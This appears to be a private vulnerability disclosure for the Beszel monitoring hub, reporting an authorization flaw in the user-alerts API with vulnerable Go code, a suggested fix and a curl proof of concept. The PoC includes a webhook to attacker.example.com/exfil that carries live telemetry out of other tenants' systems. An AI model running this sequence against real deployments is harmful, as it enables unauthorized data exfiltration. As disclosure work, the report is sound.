repo.description:
## Summary

`POST /api/beszel/user-alerts` (and `DELETE /api/beszel/user-alerts`) accept an arbitrary list of `systems[]` IDs in the request body and write `alerts` rows for those systems without verifying the authenticated user is a member of the `users` field on each target system. As a result, any authenticated non-admin user (including a `readonly` user) can:

1. Create alert rules on monitored systems they have no access to
2. When the alert triggers, receive a notification (email or shoutrrr webhook configured in the attacker's own `user_settings`) containing **the target system's name** and **a precise live metric value** (e.g., CPU %, Memory %, Disk %, Temperature °C, GPU %, LoadAvgN, Bandwidth MB/s, Battery level)
3. Repeat for any 15-character `systems.id` to enumerate existence of other tenants' systems and exfiltrate their live operational telemetry

**This is the same authorization-boundary class fixed in `GHSA-5f5r-95pg-xrpm` (CVE-2026-40077) for `/api/beszel/containers/logs`, `/api/beszel/containers/info`, `/api/beszel/systemd/info`, and `/api/beszel/smart/refresh` - but the patch never extended to `alerts.UpsertUserAlerts`. The fix added `system.HasUser(e.App, e.Auth)` to `containerRequestHandler`, `getSystemdInfo`, and `refreshSmartData` (`internal/hub/api.go:319,354,382`); `internal/alerts/alerts_api.go` was not touched.**

## Affected component

- **Repo:** `henrygd/beszel`
- **SHA audited:** `c1c1cd1bcbeb234c5735bb02d527ff76b60e7c49` (HEAD as of 2026-05-01, post `GHSA-5f5r-95pg-xrpm` fix)
- **File:** `internal/alerts/alerts_api.go`
- **Lines:** `18-77` (`UpsertUserAlerts`), `81-123` (`DeleteUserAlerts`)
- **Routes:** `POST /api/beszel/user-alerts`, `DELETE /api/beszel/user-alerts`
- **Registration:** `internal/hub/api.go:124-125` under `apiAuth.Bind(apis.RequireAuth())`. No `requireAdminRole` or `excludeReadOnlyRole` middleware. No body-level membership check.

## Vulnerable code

```go
// internal/alerts/alerts_api.go:18-77
func UpsertUserAlerts(e *core.RequestEvent) error {
    userID := e.Auth.Id

    reqData := struct {
        Min       uint8    `json:"min"`
        Value     float64  `json:"value"`
        Name      string   `json:"name"`
        Systems   []string `json:"systems"`
        Overwrite bool     `json:"overwrite"`
    }{}
    err := e.BindBody(&reqData)
    if err != nil || userID == "" || reqData.Name == "" || len(reqData.Systems) == 0 {
        return e.BadRequestError("Bad data", err)
    }

    alertsCollection, err := e.App.FindCachedCollectionByNameOrId("alerts")
    if err != nil {
        return err
    }

    err = e.App.RunInTransaction(func(txApp core.App) error {
        for _, systemId := range reqData.Systems {
            // find existing matching alert
            alertRecord, err := txApp.FindFirstRecordByFilter(alertsCollection,
                "system={:system} && name={:name} && user={:user}",
                dbx.Params{"system": systemId, "name": reqData.Name, "user": userID})
            // ^^^ This filter only fails to find a previously-created alert; it does
            //     NOT fail when the user has no access to systemId. The query simply
            //     returns sql.ErrNoRows and falls through to NewRecord(...) below.

            if err != nil && !errors.Is(err, sql.ErrNoRows) {
                return err
            }

            if !reqData.Overwrite && alertRecord != nil {
                continue
            }

            // create new alert if it doesn't exist
            if alertRecord == nil {
                alertRecord = core.NewRecord(alertsCollection)
                alertRecord.Set("user", userID)
                alertRecord.Set("system", systemId) // <-- attacker-controlled, no validation
                alertRecord.Set("name", reqData.Name)
            }

            alertRecord.Set("value", reqData.Value)
            alertRecord.Set("min", reqData.Min)

            if err := txApp.SaveNoValidate(alertRecord); err != nil {
                // SaveNoValidate bypasses the alerts collection's createRule:
                //   "@request.auth.id != \"\" && user = @request.auth.id"
                // (which only enforces user-self-relation on `user`, not system membership anyway)
                return err
            }
        }
        return nil
    })
    ...
}
```

The `alerts` collection schema (`internal/migrations/0_collections_snapshot_0_19_0_dev_1.go:11-141`) defines:

```json
"createRule": "@request.auth.id != \"\" && user = @request.auth.id",
"updateRule": "@request.auth.id != \"\" && user = @request.auth.id",
"deleteRule": "@request.auth.id != \"\" && user = @request.auth.id"
```

The createRule only verifies `user` matches the authenticated user - there is no rule constraining the `system` relation to systems the user is a member of. Worse, `SaveNoValidate` skips even this rule. The `systems` collection's all-`null` create/list/view/update/delete rules (lines 597-600) further mean PocketBase's collection-level RBAC cannot save us here - protection has to be at the API handler.

For comparison, the patched routes added the helper at the handler:

```go
// internal/hub/api.go:319 (after CVE-2026-40077 fix)
system, err := h.sm.GetSystem(systemID)
if err != nil || !system.HasUser(e.App, e.Auth) {
    return e.NotFoundError("", nil)
}
```

`UpsertUserAlerts` and `DeleteUserAlerts` were missed.

## Exfiltration path - what the attacker actually receives

When the alert triggers, `internal/alerts/alerts_system.go:300-355 sendSystemAlert` calls `am.SendAlert(...)` which (`internal/alerts/alerts.go:196-248`) reads `user_settings` for `data.UserID` (the attacker's own user record), pulls the attacker's own configured webhook URLs and email addresses, and sends a notification with:

- **Title:** `<systemName> <metric> above threshold` (or `below threshold`) - e.g., `prod-db-01 cpu above threshold`
- **Body:** `<descriptor> averaged <value:%.2f><unit> for the previous <min> <minutesLabel>.` - e.g., `CPU averaged 87.42% for the previous 1 minute.`
- **Link:** `<APP_URL>/system/<systemID>` (further confirms the system ID exists)
- **LinkText:** `View <systemName>`

For status alerts (`internal/alerts/alerts_status.go`), the same channels deliver up/down transitions - leaking system reachability/uptime patterns of any tenant.

The metric value covers any of the `alerts.name` enum: `Status`, `CPU`, `Memory`, `Disk`, `Temperature`, `Bandwidth`, `GPU`, `LoadAvg1`, `LoadAvg5`, `LoadAvg15`, `Battery`. With `Min=1` and a sensible threshold, attacker can receive multiple value snapshots per minute.

## PoC

Pre-conditions:
- Beszel hub running (any version through the audited HEAD `c1c1cd1`)
- At least two users: `admin@test.com` (admin, owns system `prod-01`) and `readonly@test.com` (readonly, no system access)
- One agent registered to `prod-01` (system ID e.g. `qz1abc...`)

```bash
# Step 1 - admin registers system A and reads its ID
TOKEN_A=$(curl -s http://localhost:8090/api/collections/users/auth-with-password \
  -H 'Content-Type: application/json' \
  -d '{"identity":"admin@test.com","password":"password1"}' \
  | jq -r '.token')
SYSTEM_A_ID=$(curl -s http://localhost:8090/api/collections/systems/records \
  -H "Authorization: $TOKEN_A" | jq -r '.items[0].id')
echo "Target system: $SYSTEM_A_ID"

# Step 2 - readonly user authenticates and confirms standard API hides system A
TOKEN_B=$(curl -s http://localhost:8090/api/collections/users/auth-with-password \
  -H 'Content-Type: application/json' \
  -d '{"identity":"readonly@test.com","password":"password2"}' \
  | jq -r '.token')

# Confirm the standard PocketBase API correctly returns 0 systems for readonly user
curl -s http://localhost:8090/api/collections/systems/records \
  -H "Authorization: $TOKEN_B" | jq '.totalItems'
# Expected: 0  (RBAC working as designed)

# Step 3 - readonly user configures own user_settings with attacker webhook
curl -s -X PATCH "http://localhost:8090/api/collections/user_settings/records/<own-id>" \
  -H "Authorization: $TOKEN_B" \
  -H 'Content-Type: application/json' \
  -d '{"settings":{"webhooks":["generic://attacker.example.com/exfil?method=POST&template=json"]}}'

# Step 4 - IDOR: subscribe to a CPU alert on system A (which user B does not own)
curl -s -X POST http://localhost:8090/api/beszel/user-alerts \
  -H "Authorization: $TOKEN_B" \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"CPU\",\"value\":0.01,\"min\":1,\"systems\":[\"$SYSTEM_A_ID\"]}"
# Expected: {"success":true}

# Step 5 - within 1-2 minutes, attacker.example.com receives a JSON POST:
#   {
#     "title":"prod-db-01 CPU above threshold",
#     "message":"CPU averaged 87.42% for the previous 1 minute.\n\nhttps://hub.example.com/system/qz1abc..."
#   }
#
# This leaks: (a) system-A existence, (b) hostname "prod-db-01", (c) live CPU value, (d) timing
```

The same primitive works for `Status` alerts (down/up transitions), `Memory`, `Disk`, `Temperature`, `Bandwidth`, `GPU`, `LoadAvg{1,5,15}`, `Battery` - any metric Beszel collects.

`DeleteUserAlerts` (line 81) has the same IDOR - readonly user can delete any alert row where they're the user; not directly cross-tenant since the schema constrains user, but the deletion still bypasses any backend-side validation if a future patch sets ownership differently.

## Impact

**Severity: Medium (CVSS:3.1 AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L = 7.6 borderline High)**

- **Confidentiality:** Live operational telemetry (CPU/Memory/Disk/Temp/GPU/LoadAvg/Bandwidth/Battery) and system existence + hostname for any monitored system, leaked to a webhook the attacker controls.
- **Integrity:** Alert state on the target system is mutated (rows added to `alerts` collection); this can affect the legitimate owner's UI ("triggered" markers in the alerts table) and writes `alerts_history` rows attributed to the attacker user.
- **Availability:** With `min=1, Overwrite=true` and many enumerated systems, the attacker can spam every cluster's monitored hosts with alert evaluation - minor amplification.
- **Multi-tenancy:** Any non-admin user (incl. `readonly`) bypasses the system membership boundary that beszel's docs explicitly advertise (`docs/guide/multi-user/...`).

**Severity comparable to or worse than the published GHSA-5f5r-95pg-xrpm**: that one was rated `low` despite reading container logs, because system IDs are 15-char random and "not exposed to all users." Same reasoning applies here, except: alerts trigger continuously over time rather than one-shot, so a single ID enumeration cycle yields ongoing telemetry; and `name` column emitted in the notification subject is the attacker's strongest oracle for whether the ID corresponds to a real system. Recommend Medium.

## Suggested fix

Mirror the GHSA-5f5r-95pg-xrpm patch. In `internal/alerts/alerts_api.go:UpsertUserAlerts` and `DeleteUserAlerts`, before writing each `alerts` row:

```go
// Resolve and authorize each system the caller targets.
for _, systemId := range reqData.Systems {
    system, err := am.hub.SystemManager().GetSystem(systemId) // or h.sm via DI
    if err != nil || !system.HasUser(e.App, e.Auth) {
        return e.NotFoundError("", nil) // 404 to avoid existence oracle
    }
    // ... existing alert upsert ...
}
```

Returning 404 (not 403) preserves the same indistinguishability the existing `containerRequestHandler` patch relies on - an attacker iterating IDs cannot distinguish "system does not exist" from "system exists but you have no access."

Optional defense-in-depth: replace `SaveNoValidate` with `Save` so the collection's existing `createRule`/`updateRule` is also enforced; add a future schema rule `system.users.id ?= @request.auth.id` once PocketBase's relation-traversal supports it for indirect access via the alert's `system` relation.

## Disclosure

- **Repo SECURITY.md:** none in repo (PVR is the channel; confirmed enabled).
- **Channel:** GitHub Security Advisory (private vulnerability reporting) on `henrygd/beszel`.
- **Coordinated disclosure:** standard 90-day from initial report, willing to coordinate.
- **Reporter:** Independent security research (Go top-50 audit campaign).
- **Reported alongside:** Existing in-triage advisory `GHSA-wm2q-cp5w-449c` (BESZEL-001 - test-notification SSRF). Recommend bundling both fixes.
repo.summary: Authenticated IDOR in `/api/beszel/user-alerts` allows user to subscribe to alerts on systems they don't own by guessing 15 character random alphanumeric system ID
